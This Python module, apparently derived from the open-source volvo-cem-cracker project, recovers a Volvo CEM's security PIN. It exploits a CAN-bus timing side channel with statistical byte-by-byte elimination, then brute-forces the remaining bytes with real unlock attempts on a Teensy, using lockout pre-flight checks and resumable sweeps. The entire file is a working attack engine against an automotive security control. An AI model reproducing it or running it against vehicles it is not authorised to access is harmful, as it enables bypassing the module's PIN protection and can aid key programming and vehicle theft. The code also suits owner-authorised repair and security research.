# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (C) 2026 Jason Gainor
# Derived from volvo-cem-cracker — Copyright (C) 2020, 2021 Vitaly Mayatskikh,
# Christian Molson, Mark Dapoz — https://github.com/vtl/volvo-cem-cracker (GPL-3.0).
"""The smart CEM PIN search: statistical best-arm elimination on a quantized CEM timing
side-channel, with a measurability gate and a deterministic finish (see README.md).

Why this beats a naive sweep (uniform 100 candidates x 100 x fixed-samples, greedy commit):

  1. ROBUST BUCKET STATISTIC, not the raw mean. The real CEM latency is quantized to ~2us
     buckets and bimodal; a correct byte only nudges probability mass toward the higher
     buckets. We score each candidate by p_hi = the (tie-corrected) fraction of its samples
     ABOVE the pooled median of the field — a Bernoulli rate with exact SE sqrt(p(1-p)/n).
     This ignores outlier MAGNITUDE (the ~43us CAN-retransmit glitches just count as "low"),
     is data-driven (no hardcoded threshold, works on any channel), and is ~2x more sample
     efficient than a mean on this distribution.

  2. NEVER CULL THE TRUTH. Best-arm by confidence-interval successive elimination with a
     hard MIN_SAMPLES floor and a Bonferroni z over the 100 arms: an arm whose CI still
     reaches the leader is never dropped, so noise cannot lose the correct byte.

  3. MEASURABILITY GATE (the fix for vtl's "byte 3 always different"). If, after a check
     budget, the top two candidates' CIs still overlap, the byte is DECLARED UNMEASURABLE
     rather than committed to a coin-flip. An unmeasurable byte carries its FULL 100-value
     axis into the finish — the true value is then structurally guaranteed to be in the
     search, so the cascade failure (greedily committing a coin-flip byte, then brute-forcing
     the rest against a wrong value) is impossible here.

  4. DETERMINISTIC FINISH. Timing fixes the measurable bytes; the rest are resolved by
     real unlock attempts over the cartesian product (gifts + measured top-K + full axes for
     unmeasurable bytes), streamed most-likely-first (low-entropy human-PIN ordering on the
     unknown axes) and resumable by a persisted cursor.

  5. GIFTS + RE-CONFIRM. Any bytes already known for a given car (supplied at runtime via
     CrackConfig.gift_bytes — NOT baked into this tool) are seeded, but RE-CONFIRMED against
     today's bench before any brute time is spent (catches a wrong shuffle or voltage drift
     early). Every gift removes a factor of 100 from the sweep.

Byte ordering (must match the CEM, verified against vtl/volvo-cem-cracker): each PIN byte pin[i]
is placed into the CAN frame at message byte msg[order[i]] (cemproto.build_unlock_frame, identical
to vtl's `pMsgPin[shuffle_order[i]] = pin[i]`). The CEM validates the message bytes in shuffle
order, so pin[i] is BY CONSTRUCTION the i-th byte the CEM checks. We therefore attack the positions
in PLAIN INDEX ORDER 0,1,...,5 — which IS the CEM's check order — exactly like the upstream loop
`for i in 0..5: crackPinPosition(pin, i)`. (Attacking in order[k] instead would fix the bytes in a
scrambled sequence: a position attacked before its check-order predecessors are pinned shows no
signal and is wrongly declared unmeasurable, needlessly inflating the brute sweep.) On the real car
the shuffle is passed explicitly (autodetect is fragile and wasted ~half of vtl's wall-clock).
"""
from __future__ import annotations

import json
import math
import statistics
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path

from . import cemproto


# --- recover/resume: translate a prior run's wall-clock into a sweep cursor --------------------
# Measured on the reference rig: 42,209,688 unlock attempts in 27,589 s ≈ 654 µs each. Used so an
# INTERRUPTED sweep (USB drop / power loss / host crash) can resume near where it died instead of
# restarting from 0. (Single source of truth; the web UI and tests both call resume_cursor().)
SWEEP_RATE_S = 0.000654
# Resume this fraction BEFORE the runtime estimate. Re-covering already-tested combos is harmless;
# SKIPPING past the death point could skip the true PIN. So a runtime-based guess deliberately
# under-shoots. (An EXACT index read from a logged 'sweep progress N' line is used as-is, no rewind.)
RESUME_REWIND_FRAC = 0.05


@dataclass
class CrackConfig:
    warmup_pulls: int = 64           # samples every surviving arm gets per round (also the floor)
    max_pulls_per_byte: int = 10000  # base probe budget per byte position
    confirm_factor: int = 6          # per-position hard cap = max_pulls_per_byte * this
    z: float = 3.72                  # separation confidence; 3.72 ~= Bonferroni over 100 arms @ FWER 0.01
    min_samples: int = 64            # floor before an arm may be eliminated (don't cull on noise)
    top_k_carry: int = 4             # measured candidates carried forward for a SEPARATED byte
    carry_unmeasurable: int = 100    # candidates carried for an UNMEASURABLE byte (full axis = 100)
    assume_unmeasurable: bool = False  # skip per-byte timing entirely; carry EVERY non-gift byte's
                                       # full axis to the sweep. Use when the timing channel is
                                       # confounded (e.g. a systematic per-value bias from CAN
                                       # bit-stuffing) so a "separation" would be FALSE and exclude
                                       # the truth. Guarantees a correct (but full 100^k) sweep.
    n_check_unmeasurable: int = 20000  # probes spent before a byte may be declared unmeasurable
    unmeasurable_sep_k: float = 4.0  # top-2 separation gate (in combined std-errors)
    verify_budget: int = 100_000_000  # max real unlock attempts in the deterministic finish (100^4)
    randomize_unknown: bool = True   # randomize not-yet-known bytes to marginalize them
    gift_bytes: dict = field(default_factory=dict)  # {position: value} known-good seeds
    gift_confirm: bool = True        # re-measure gift bytes and HALT on mismatch
    gift_confirm_pulls: int = 40000  # probes used to re-confirm each gift byte (split over the field)
    enumeration_prior: str = "low_entropy_human_pin"  # order unknown axes by this prior
    lockout_probe_count: int = 5000  # wrong-unlock pre-flight before a sweep (0 = skip); detects throttle
    batch_unlock: bool = True        # delegate the exhaustive sweep to the Teensy (CAN-bound)
    sweep_probe_s: float = 0.0008   # ~seconds per sweep unlock attempt (measured ~654us + overhead)


@dataclass
class ByteResult:
    position: int                 # PIN position (index 0..5)
    committed: int | None = None  # the chosen byte, or None if unmeasurable/ambiguous
    candidates: list = field(default_factory=list)   # [(value, score)] best first
    pulls: int = 0
    separated: bool = False       # True if confidently resolved by timing alone
    gift: bool = False            # True if this byte came from a confirmed gift seed


def _human_pin_order() -> list[int]:
    """The 100 BCD byte values ordered low-entropy-first (a free prior for the brute axes):
    repeats (00,11,..), then ascending/descending runs, then everything else ascending."""
    pri: list[int] = []
    def add(v):
        b = cemproto.bin_to_bcd(v)
        if b not in pri:
            pri.append(b)
    for d in range(10):          # 00,11,22,...,99
        add(d * 11)
    for d in range(9):           # 01,12,23,...,89
        add(d * 10 + d + 1)
    for d in range(9, 0, -1):    # 98,87,...,10
        add(d * 10 + d - 1)
    for v in (12, 21, 13, 31, 7, 42, 69, 24, 1, 99):  # a few common human picks
        add(v)
    for v in range(100):         # then the rest, ascending
        add(v)
    return pri


_HUMAN_ORDER = _human_pin_order()


class CrackEngine:
    def __init__(self, transport, shuffle_order=None, config: CrackConfig | None = None,
                 checkpoint_path: str | None = None, progress_cb=None, log_cb=None):
        self.tx = transport
        self.order = shuffle_order   # None => autodetect (avoid on real car; pass explicitly)
        self.cfg = config or CrackConfig()
        self.checkpoint_path = Path(checkpoint_path) if checkpoint_path else None
        self.progress_cb = progress_cb
        self.log_cb = log_cb         # receives a structured log record per notable event
        self.abort = False
        self.probes = 0
        self.verify_cursor = 0       # resume index into the deterministic finish
        self.t0 = None
        self.status = {"phase": "idle", "pin": [None] * cemproto.PIN_LEN,
                       "bytes": [], "probes": 0, "elapsed": 0.0, "shuffle": None, "result": None}

    # ---- helpers -----------------------------------------------------------
    def _emit(self, **kw):
        self.status.update(kw)
        self.status["probes"] = self.probes
        self.status["elapsed"] = round(time.monotonic() - self.t0, 1) if self.t0 else 0.0
        if self.progress_cb:
            self.progress_cb(dict(self.status))

    def _log(self, msg, level="info"):
        """Emit one verbose log record (timestamped, with running probe count) to the log sink.
        Separate from _emit (which carries the latest UI snapshot): _log is an append-only stream
        of notable decisions — per-round elimination, gift confirms, separation, sweep milestones —
        so the web client can show a scrolling narrative instead of just the current phase."""
        if not self.log_cb:
            return
        self.log_cb({"elapsed": round(time.monotonic() - self.t0, 1) if self.t0 else 0.0,
                     "probes": self.probes, "level": level, "msg": msg})

    def _sample(self, pin, n):
        import random
        order = self.order
        out = []
        for _ in range(n):
            probe_pin = list(pin)
            if self.cfg.randomize_unknown:
                for p in range(cemproto.PIN_LEN):
                    if pin[p] is None:
                        probe_pin[p] = cemproto.bin_to_bcd(random.randint(0, 99))
            else:
                probe_pin = [b if b is not None else 0 for b in probe_pin]
            out += self.tx.probe(probe_pin, 1, order)
            self.probes += 1
        return out

    # ---- robust bucket statistic ------------------------------------------
    @staticmethod
    def _pooled_threshold(arms, alive):
        """Field median across all live arms' samples — the data-driven high/low cut. Channel
        agnostic (works whether latencies sit at ~87us or ~110us); robust to the low outliers."""
        pool = []
        for v in alive:
            pool.extend(arms[v])
        return statistics.median(pool) if pool else 0.0

    @staticmethod
    def _arm_score(xs, threshold):
        """p_hi = tie-corrected fraction of samples ABOVE threshold, with Bernoulli SE.
        A correct byte shifts latency up, so it lands above the field median more often."""
        n = len(xs)
        if n == 0:
            return 0.0, float("inf")
        above = sum(1 for x in xs if x > threshold)
        equal = sum(1 for x in xs if x == threshold)
        p = (above + 0.5 * equal) / n
        se = math.sqrt(p * (1 - p) / n) if n > 1 else float("inf")
        return p, se

    def _ranked(self, arms, alive=None):
        """Live arms ranked best-first by p_hi (mean latency as a deterministic tiebreak)."""
        keys = list(alive) if alive is not None else [v for v in arms if arms[v]]
        thr = self._pooled_threshold(arms, keys)
        def key(v):
            p, _ = self._arm_score(arms[v], thr)
            m = statistics.fmean(arms[v]) if arms[v] else 0.0
            return (p, m)
        return sorted(keys, key=key, reverse=True), thr

    # ---- best-arm search for one byte position -----------------------------
    def _best_arm(self, pin, pos, budget, on_round=None):
        """CI successive elimination over the 100 BCD candidates on the p_hi statistic. Each
        round samples the live arms a batch, recomputes the pooled threshold, and drops only
        arms whose p_hi CI is CLEARLY below the leader's (and only after min_samples). Returns
        (arms, pulls)."""
        cfg = self.cfg
        arms = {v: [] for v in cemproto.bcd_values()}
        alive = set(arms)
        pulls = 0
        while len(alive) > 1 and pulls < budget and not self.abort:
            for v in list(alive):
                trial = list(pin)
                trial[pos] = v
                arms[v] += self._sample(trial, cfg.warmup_pulls)
                pulls += cfg.warmup_pulls
            thr = self._pooled_threshold(arms, alive)
            score = {v: self._arm_score(arms[v], thr) for v in alive}
            leader = max(alive, key=lambda v: (score[v][0], statistics.fmean(arms[v])))
            lp, lse = score[leader]
            if min(len(arms[v]) for v in alive) >= cfg.min_samples:
                lb = lp - cfg.z * lse
                alive = {v for v in alive if v == leader or (score[v][0] + cfg.z * score[v][1]) >= lb}
            if on_round:
                on_round(arms, pulls, alive)
        return arms, pulls

    def _sep_topk(self, arms, alive):
        """(ranked, separated, top_list). 'separated' = the leader's p_hi lower CI is clearly
        above the runner-up's upper CI (the measurability test, evaluated continuously)."""
        ranked, thr = self._ranked(arms, alive)
        top = [(v, round(self._arm_score(arms[v], thr)[0], 3)) for v in ranked[:self.cfg.top_k_carry]]
        if len(ranked) == 1:
            return ranked, True, top
        (p1, se1) = self._arm_score(arms[ranked[0]], thr)
        (p2, se2) = self._arm_score(arms[ranked[1]], thr)
        return ranked, (p1 - self.cfg.z * se1) > (p2 + self.cfg.z * se2), top

    def _crack_position(self, pin, pos) -> ByteResult:
        """Best-arm elimination until EITHER the leader clearly separates from the runner-up
        (MEASURABLE -> commit + carry top-K) OR the budget/check is spent without separation
        (UNMEASURABLE -> carry the full 100-value axis; the final sweep resolves it). This
        binary decision is the whole fix: we never commit a coin-flip byte (vtl's failure)."""
        cfg = self.cfg
        if cfg.assume_unmeasurable:
            # The timing channel is known-confounded on this CEM (a systematic per-value bias makes
            # any "separation" false). Don't measure — carry the full axis so the true value is
            # structurally guaranteed to be in the sweep. (Gifts are handled before this is called.)
            vals = _HUMAN_ORDER[:cfg.carry_unmeasurable]
            self._log(f"pos {pos}: timing SKIPPED (assume_unmeasurable) — carrying full {len(vals)}-"
                      f"value axis to the sweep", level="warn")
            return ByteResult(position=pos, committed=None,
                              candidates=[(v, None) for v in vals], pulls=0, separated=False)
        budget = cfg.max_pulls_per_byte * cfg.confirm_factor   # hard cap
        arms = {v: [] for v in cemproto.bcd_values()}
        alive = set(arms)
        pulls = 0
        rounds = 0
        self._log(f"position {pos}: starting timing scan (100 candidates, budget {budget} probes)")
        while len(alive) > 1 and pulls < budget and not self.abort:
            for v in list(alive):
                trial = list(pin)
                trial[pos] = v
                arms[v] += self._sample(trial, cfg.warmup_pulls)
                pulls += cfg.warmup_pulls
            thr = self._pooled_threshold(arms, alive)
            score = {v: self._arm_score(arms[v], thr) for v in alive}
            leader = max(alive, key=lambda v: (score[v][0], statistics.fmean(arms[v])))
            lp, lse = score[leader]
            if min(len(arms[v]) for v in alive) >= cfg.min_samples:
                lb = lp - cfg.z * lse
                alive = {v for v in alive if v == leader or (score[v][0] + cfg.z * score[v][1]) >= lb}
            ranked, separated, top = self._sep_topk(arms, alive)
            self._emit(phase=f"scanning position {pos} ({len(alive)} contenders, {pulls} probes)",
                       bytes=self._byte_status(pin, pos, top, pulls))
            rounds += 1
            if len(top) >= 2:
                (l_v, l_p), (r_v, r_p) = top[0], top[1]
                margin = (lp - cfg.z * lse) - (score[ranked[1]][0] + cfg.z * score[ranked[1]][1])
                self._log(f"pos {pos} round {rounds}: {len(alive)} alive, {pulls} probes | "
                          f"lead 0x{l_v:02X} p_hi={l_p} vs 0x{r_v:02X} p_hi={r_p} | "
                          f"sep margin {margin:+.3f} (need >0)")
            if separated:
                best = ranked[0]
                if top and top[0][0] != best:
                    top = [(best, top[0][1])] + [t for t in top if t[0] != best]
                self._log(f"pos {pos}: MEASURABLE — committed 0x{best:02X} after {pulls} probes; "
                          f"carrying top {len(top[:cfg.top_k_carry])}", level="good")
                return ByteResult(position=pos, committed=best, candidates=top[:cfg.top_k_carry],
                                  pulls=pulls, separated=True)
            # early abandonment: spent the check budget and the field is barely culled -> flat byte
            if pulls >= cfg.n_check_unmeasurable and len(alive) > cfg.top_k_carry:
                self._log(f"pos {pos}: check budget spent ({pulls} probes), {len(alive)} still alive "
                          f"— signal below the noise floor", level="warn")
                break
        # no clean separation within budget -> UNMEASURABLE: carry the full axis (human-ordered)
        # so the true value is structurally guaranteed to be in the deterministic finish.
        vals = _HUMAN_ORDER[:cfg.carry_unmeasurable]
        self._log(f"pos {pos}: UNMEASURABLE — carrying full {len(vals)}-value axis to the sweep "
                  f"finish (truth guaranteed in-search; vtl's failure avoided)", level="warn")
        return ByteResult(position=pos, committed=None,
                          candidates=[(v, None) for v in vals], pulls=pulls, separated=False)

    def _byte_status(self, pin, active_pos, top, pulls):
        out = []
        for p in range(cemproto.PIN_LEN):
            out.append({"pos": p, "value": pin[p],
                        "active": p == active_pos,
                        "top": top if p == active_pos else None,
                        "pulls": pulls if p == active_pos else None})
        return out

    # ---- gifts --------------------------------------------------------------
    def _confirm_gift(self, pin, pos, val, field_size=12) -> bool:
        """Re-confirm a gift byte against today's bench: drop it into a small field of random
        rivals and require its p_hi lower-CI to stand ABOVE the rivals' median p_hi. A correct
        gift carries real signal (sits high above the pack); a wrong gift (or a wrong shuffle /
        voltage drift) sits in the noise at the median, so this catches it before any brute time."""
        import random
        rivals = []
        while len(rivals) < field_size - 1:
            c = cemproto.bin_to_bcd(random.randint(0, 99))
            if c != val and c not in rivals:
                rivals.append(c)
        field = [val] + rivals
        per = max(400, self.cfg.gift_confirm_pulls // field_size)
        arms = {}
        for v in field:
            trial = list(pin); trial[pos] = v
            arms[v] = self._sample(trial, per)
        thr = self._pooled_threshold(arms, set(field))
        pv, sev = self._arm_score(arms[val], thr)
        rival_med = statistics.median([self._arm_score(arms[v], thr)[0] for v in rivals])
        ok = (pv - self.cfg.z * sev) > rival_med
        self._log(f"gift pos {pos} = 0x{val:02X}: confirm p_hi={pv:.3f} "
                  f"(lower-CI {pv - self.cfg.z * sev:+.3f}) vs rival median {rival_med:.3f} -> "
                  f"{'CONFIRMED' if ok else 'REJECTED'}", level="good" if ok else "bad")
        return ok

    # ---- shuffle autodetect (avoid on real car) ----------------------------
    def detect_shuffle(self, samples=48):
        return self.scored_orders(samples)[0]

    def scored_orders(self, samples=48):
        """Shuffle orders ranked best-first by first-byte signal (heuristic; the sweep is the
        real arbiter). Uses the same p_hi statistic. Only needed when shuffle is unknown."""
        scores = []
        for order in cemproto.SHUFFLE_ORDERS:
            if self.abort:
                break
            self.order = order
            self._emit(phase=f"scoring shuffle {order}")
            arms = {}
            for v in cemproto.bcd_values():
                trial = [None] * cemproto.PIN_LEN
                trial[0] = v             # vary pin[0] = the first byte the CEM checks (lands at msg[order[0]])
                arms[v] = self._sample(trial, samples)
            thr = self._pooled_threshold(arms, set(arms))
            ps = sorted((self._arm_score(arms[v], thr)[0] for v in arms), reverse=True)
            scores.append((order, ps[0] - statistics.median(ps)))
        return [o for o, _ in sorted(scores, key=lambda s: s[1], reverse=True)]

    # ---- deterministic finish ----------------------------------------------
    def _candidate_axes(self, results):
        """Per-position ordered candidate value lists for the finish."""
        per_pos = [None] * cemproto.PIN_LEN
        for r in results:
            vals = [v for v, _ in r.candidates] or _HUMAN_ORDER
            per_pos[r.position] = vals
        return per_pos

    @staticmethod
    def _human_time(secs):
        if secs < 90:   return f"{secs:.0f}s"
        if secs < 5400: return f"{secs/60:.1f} min"
        return f"{secs/3600:.1f} h"

    @staticmethod
    def resume_cursor(runtime_s=0.0, swept_bytes=4, exact_index=None,
                      rate_s=SWEEP_RATE_S, rewind=RESUME_REWIND_FRAC):
        """Estimate where a prior interrupted sweep died, as a linear index into the 100**swept_bytes
        product space, so a recover run can resume there instead of from 0. Provide EITHER:
          - exact_index: read the last 'sweep progress N' line from the dead run's log — precise, used
            as-is (that index was already tested, so re-testing it is harmless); or
          - runtime_s: how long that run ran. index = runtime/rate, then rewound a safety margin so we
            never skip past the true PIN (re-covering tested combos is cheap; skipping is fatal).
        swept_bytes MUST match the dead run (here = 6 - number of gifts). Returns (cursor, space)."""
        space = 100 ** max(0, int(swept_bytes))
        if exact_index is not None:
            cur = int(exact_index)
        else:
            raw = (float(runtime_s) / rate_s) if rate_s > 0 else 0.0
            cur = int(raw * (1.0 - rewind))              # under-shoot: re-test is safe, skipping is not
        cur = max(0, min(cur, space - 1)) if space > 0 else 0
        return cur, space

    def _sweep_estimate(self, results):
        """Predict the deterministic-finish cost BEFORE running it, so a multi-hour sweep never
        starts unannounced. The Teensy batch sweep fixes the gift/measured bytes and brute-forces
        the rest at full 100-axis, so the real cost is 100^(unresolved positions)."""
        swept = [r.position for r in results
                 if not (r.committed is not None and (r.separated or r.gift))]
        measured = cemproto.PIN_LEN - len(swept)
        space = 100 ** len(swept)
        secs = space * self.cfg.sweep_probe_s
        self._emit(phase=f"sweep estimate: {space:,} combos ≈ {self._human_time(secs)} "
                         f"({measured}/{cemproto.PIN_LEN} bytes resolved by timing/gifts)")
        self._log(f"--- SWEEP ESTIMATE --- timing/gifts resolved {measured}/{cemproto.PIN_LEN} bytes; "
                  f"brute positions {swept}; finish searches {space:,} combos at ~"
                  f"{self.cfg.sweep_probe_s * 1e6:.0f}us each ≈ {self._human_time(secs)}",
                  level="warn" if secs > 1800 else "good")
        if secs > 1800:
            self._log("    (>30 min — seed another known byte to cut a 100x factor, or Stop to "
                      "reconsider before committing)", level="warn")
        return space, secs

    def _verify(self, results):
        """Resolve the remaining unknowns by real unlock attempts (the sweep is the sole
        arbiter). On real hardware delegate the exhaustive sweep to the Teensy (CAN-bound, the
        big speed lever); in-process otherwise."""
        if hasattr(self.tx, "batch_sweep"):
            return self._verify_batch(results)
        return self._verify_host(results)

    def _verify_batch(self, results):
        """Fix the gift/measured bytes, then let the Teensy sweep the unmeasurable positions over
        their full axis. Runs a lockout pre-flight first so we don't commit to an hours-long sweep
        against a CEM that throttles failed unlocks."""
        by_pos = {r.position: r for r in results}
        base_pin = [0] * cemproto.PIN_LEN
        swept = []
        # NOTE (known limitation): a TIMING-separated byte is fixed to its single committed value on
        # the Teensy sweep path — its carried top-K is NOT re-tried here (unlike the host path). The
        # z=3.72 Bonferroni gate makes a false separation rare, but if one happened the sweep would
        # exhaust to FAILED; the recovery is simply to re-run (the noise reshuffles). For a GIFT-only
        # crack (no timing-separated bytes — e.g. this bench's pin[0],pin[1] gifts) this can't occur.
        timing_committed = []
        for p in range(cemproto.PIN_LEN):
            r = by_pos.get(p)
            if r and r.committed is not None and (r.separated or r.gift):
                base_pin[p] = r.committed
                if r.separated and not r.gift:
                    timing_committed.append(p)
            else:
                swept.append(p)
        if not swept:                                  # everything measured -> single unlock
            return list(base_pin) if self.tx.unlock(list(base_pin), self.order) else None
        base_frame = cemproto.build_unlock_frame(base_pin, self.order)
        varpos = [self.order[p] + 2 for p in swept]    # +2: frame = [0x50,0xBE, msg0..msg5]
        space = 100 ** len(swept)

        self._log(f"final sweep: {len(swept)} unmeasurable position(s) -> sweeping {space:,} "
                  f"real unlocks on the Teensy (frame bytes {varpos})")
        if self.cfg.lockout_probe_count and hasattr(self.tx, "lockout_probe"):
            self._emit(phase=f"lockout pre-flight ({self.cfg.lockout_probe_count} wrong unlocks)")
            self._log(f"lockout pre-flight: firing {self.cfg.lockout_probe_count} deliberately-wrong "
                      f"unlocks to check whether this CEM throttles")
            resp, n = self.tx.lockout_probe(self.cfg.lockout_probe_count, abort=lambda: self.abort)
            if resp < 0.9 * n:
                self._emit(phase=f"LOCKOUT DETECTED — CEM answered only {resp}/{n}; sweep unsafe at speed")
                self._log(f"LOCKOUT DETECTED — CEM answered only {resp}/{n} wrong unlocks; aborting "
                          f"before an unsafe long sweep (raise the inter-attempt gap and retry)",
                          level="bad")
                return None
            self._log(f"lockout pre-flight OK — CEM answered {resp}/{n}; safe to sweep", level="good")

        self._emit(phase=f"sweeping {space:,} on the Teensy (sweep decides)")

        def prog(idx):
            self.verify_cursor = idx
            self.probes = idx
            self._emit(phase=f"sweeping {idx:,} / {space:,}")
            self._log(f"sweep progress {idx:,} / {space:,} ({100.0 * idx / space:.2f}%)")
            self._save(results)

        frame, _ = self.tx.batch_sweep(base_frame, varpos, start=self.verify_cursor,
                                       progress_cb=prog, abort=lambda: self.abort)
        if frame is None:
            if timing_committed and not self.abort:
                self._log(f"sweep exhausted with NO unlock. Bytes fixed by timing this run: "
                          f"{timing_committed} — if one was a false separation the truth was excluded; "
                          f"re-running re-measures them (noise reshuffles).", level="warn")
            return None
        return [frame[self.order[i] + 2] for i in range(cemproto.PIN_LEN)]   # frame -> pin

    def _verify_host(self, results):
        """Stream the cartesian product of per-position candidate axes (most-likely first) and
        actually unlock until one succeeds. Streams (never materializes 100^4); resumable via
        verify_cursor; the unlock attempt is the sole arbiter. On a hit, re-verify once."""
        import itertools
        per_pos = self._candidate_axes(results)
        space = 1
        for a in per_pos:
            space *= len(a)
        self._emit(phase=f"verifying (search space {space:,}; sweep decides)")
        self._log(f"final sweep (host): streaming {space:,} candidate PINs most-likely-first "
                  f"(budget {self.cfg.verify_budget:,} unlock attempts)")
        tried = 0
        for combo in itertools.product(*per_pos):
            if self.abort or tried >= self.cfg.verify_budget:
                break
            if tried < self.verify_cursor:   # resume: skip already-tried prefix
                tried += 1
                continue
            tried += 1
            self.verify_cursor = tried
            self.probes += 1
            if tried % 5000 == 0:
                self._emit(phase=f"verifying ({tried:,}/{space:,})")
                self._log(f"final sweep: tried {tried:,} / {space:,} ({100.0 * tried / space:.2f}%)")
                self._save(results)
            if self.tx.unlock(list(combo), self.order):
                if self.tx.unlock(list(combo), self.order):   # re-verify a hit
                    return list(combo)
        return None

    # ---- checkpoint ---------------------------------------------------------
    def _save(self, results):
        if not self.checkpoint_path:
            return
        self.checkpoint_path.write_text(json.dumps({
            "shuffle": self.order, "probes": self.probes, "verify_cursor": self.verify_cursor,
            "results": [asdict(r) for r in results]}, indent=2))

    def _load(self):
        if self.checkpoint_path and self.checkpoint_path.exists():
            d = json.loads(self.checkpoint_path.read_text())
            self.order = tuple(d["shuffle"]) if d.get("shuffle") else self.order
            self.probes = d.get("probes", 0)
            self.verify_cursor = d.get("verify_cursor", 0)
            return [ByteResult(**r) for r in d["results"]]
        return []

    # ---- one full attempt for a fixed shuffle ------------------------------
    def _attempt(self, results) -> list[int] | None:
        cfg = self.cfg
        pin = [None] * cemproto.PIN_LEN
        for r in results:               # restore committed bytes from checkpoint
            pin[r.position] = r.committed
        done = {r.position for r in results}

        # Seed gifts. We CONFIRM only pin[0], and only when it is gifted. The side channel is a
        # cumulative leading-correct prefix: a gift at position p shows signal ONLY when pin[0..p-1]
        # are already correct. pin[0] is the first byte checked (no predecessors) and carries the
        # strongest per-byte gain, so it's the one gift we can re-measure cheaply — confirming it
        # validates the shuffle + bench (the things that could be wrong). Deeper gifts are seeded on
        # faith: confirming a deep gift whose predecessors are unknown would measure it against
        # RANDOM predecessors, see no signal, and FALSELY reject a correct gift (then wrongly abort
        # the whole order). So if pin[0] isn't gifted, we confirm nothing.
        gifted = [k for k in range(cemproto.PIN_LEN)
                  if k in cfg.gift_bytes and k not in done]
        confirm_pos = 0 if 0 in gifted else None
        for pos in gifted:
            if self.abort:
                return None
            val = cfg.gift_bytes[pos]
            if cfg.gift_confirm and pos == confirm_pos and not self._confirm_gift(pin, pos, val):
                self._emit(phase=f"GIFT MISMATCH at pos {pos} (expected {val:02X}) — "
                                 f"wrong shuffle or bench drift; aborting this order")
                self._log(f"gift pos {pos} = 0x{val:02X} FAILED confirmation — wrong shuffle or "
                          f"bench drift; abandoning this shuffle order", level="bad")
                return None
            pin[pos] = val
            tag = "confirmed" if (pos == confirm_pos and cfg.gift_confirm) else "seeded"
            results.append(ByteResult(position=pos, committed=val,
                                      candidates=[(val, 1.0)], separated=True, gift=True))
            done.add(pos)
            self.status["pin"] = list(pin)
            self._emit(phase=f"gift pos {pos} = {val:02X} ({tag})")
            self._log(f"gift pos {pos} = 0x{val:02X} ({tag}) — removes a 100x factor from the sweep",
                      level="good")

        for k in range(cemproto.PIN_LEN):
            if self.abort:
                self._emit(phase="aborted")
                return None
            pos = k                      # CEM checks pin[i] i-th (see module docstring) -> plain order
            if pos in done:
                continue
            res = self._crack_position(pin, pos)
            results.append(res)
            pin[pos] = res.committed     # None if unmeasurable
            self.status["pin"] = list(pin)
            self._save(results)
            if res.separated:
                conf = f"measured = {res.committed:02X}"
            elif res.committed is None:
                conf = f"UNMEASURABLE — carrying full {len(res.candidates)}-value axis to the finish"
            else:
                conf = f"low-confidence, carrying top {len(res.candidates)}"
            self._emit(phase=f"position {pos}: {conf}")
        results.sort(key=lambda r: r.position)
        self._sweep_estimate(results)            # announce the brute cost BEFORE the long sweep
        return self._verify(results)

    # ---- main ---------------------------------------------------------------
    def crack(self, resume=False, resume_index=None) -> list[int] | None:
        self.t0 = time.monotonic()
        # NOTE: do NOT reset self.abort here — __init__ already set it False and the web UI builds a
        # fresh engine per run. Resetting it would clobber a Stop that landed in the window between
        # the worker thread starting and this method running (the operator's panic-Stop would no-op).
        if resume_index is not None:                    # RECOVER MODE: start the sweep part-way in
            self.verify_cursor = max(0, int(resume_index))

        gifts = self.cfg.gift_bytes
        self._log("=== CEM PIN crack started ===")
        if resume_index is not None:
            self._log(f"RECOVER MODE: resuming the sweep at index {self.verify_cursor:,} — earlier "
                      f"combos are re-tested, not skipped (give the SAME gifts/shuffle as the dead run)",
                      level="warn")
        self._log(f"gifts supplied: " + (", ".join(f"pin[{p}]=0x{v:02X}" for p, v in sorted(gifts.items()))
                                         if gifts else "none (all 6 bytes will be searched)"))

        if self.order is not None:
            self._emit(shuffle=self.order)
            self._log(f"shuffle order fixed to {tuple(self.order)} (passed explicitly)")
            orders = [self.order]
        else:
            self._log("shuffle order not given — scoring all 4 candidate orders by first-byte signal")
            orders = self.scored_orders()   # try best-scoring first; sweep self-corrects

        results = self._load() if resume else []
        try:
            if hasattr(self.tx, "prog_on"):
                self.tx.prog_on()
                self._log("programming mode ON — bus quiet, CEM responsive", level="good")
            for i, order in enumerate(orders):
                if self.abort:
                    break
                self.order = order
                self._emit(shuffle=order, phase=f"trying shuffle {order}"
                           + (f" ({i+1}/{len(orders)})" if len(orders) > 1 else ""))
                if len(orders) > 1:
                    self._log(f"trying shuffle order {tuple(order)} ({i+1}/{len(orders)})")
                recovered = self._attempt(results if (resume and i == 0) else [])
                if recovered:
                    self.status["pin"] = list(recovered)
                    self._emit(phase="DONE", result=recovered, shuffle=order)
                    self._log(f"=== PIN RECOVERED: {cemproto.fmt_pin(recovered)} ===", level="good")
                    return recovered
                if self.abort:
                    self._log("aborted by user", level="warn")
                    return None
            self._emit(phase="FAILED — no PIN recovered", result=None)
            self._log("=== FAILED — no PIN recovered within budget ===", level="bad")
            return None
        finally:
            # ALWAYS try to return the car to normal — success, failure, or abort (no battery pull
            # needed). If the reset FAILS, do NOT hide it: the car may still be in programming mode,
            # and the operator must know to recover manually. Retry once, then surface it loudly.
            if hasattr(self.tx, "prog_off"):
                for attempt in range(2):
                    try:
                        self.tx.prog_off()
                        self._log("programming mode OFF — all ECUs reset to normal", level="good")
                        break
                    except Exception as e:        # noqa: BLE001
                        if attempt == 0:
                            self._log(f"prog-mode reset attempt failed ({e}) — retrying once", level="warn")
                            continue
                        self.status["reset_failed"] = True
                        self._emit(phase="⚠ RESET MAY HAVE FAILED — the car may STILL be in programming "
                                         "mode. Click 'Exit prog mode' (FF C8), or disconnect the "
                                         "battery negative for ~90 s. (The Teensy also auto-resets after "
                                         "~10 s of host silence.)")
                        self._log(f"!!! prog-mode reset FAILED ({e}) — the car may STILL BE IN "
                                  f"PROGRAMMING MODE. Recover: 'Exit prog mode' or battery disconnect.",
                                  level="bad")
